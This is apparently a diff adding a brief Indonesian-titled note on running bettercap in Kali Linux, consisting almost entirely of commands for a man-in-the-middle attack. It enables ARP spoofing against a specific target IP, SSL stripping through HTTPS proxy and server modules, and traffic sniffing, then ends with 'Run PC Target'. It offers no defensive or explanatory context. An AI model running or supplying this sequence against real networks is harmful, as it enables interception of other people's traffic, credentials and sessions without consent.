@@ -1,0 +1,26 @@
+Bettercap menggunakan Kali Linux 
+
+$ sudo bettercap
+
+> net.probe on
+> net.recon on
+> set https.proxy.sslstrip true
+> set https.server.sslstrip true
+> set arp.spoof.internal true
+> set arp.spoof.targets 192.168.81.70
+> set net.sniff.verbose 
+> set net.sniff.verbose false
+> https.proxy on
+> http.proxy on
+> https.server on
+> http.server on
+> arp.spoof on
+> net.sniff on
+> net.probe on
+
+-> Run PC Target
+
+
+
+
+
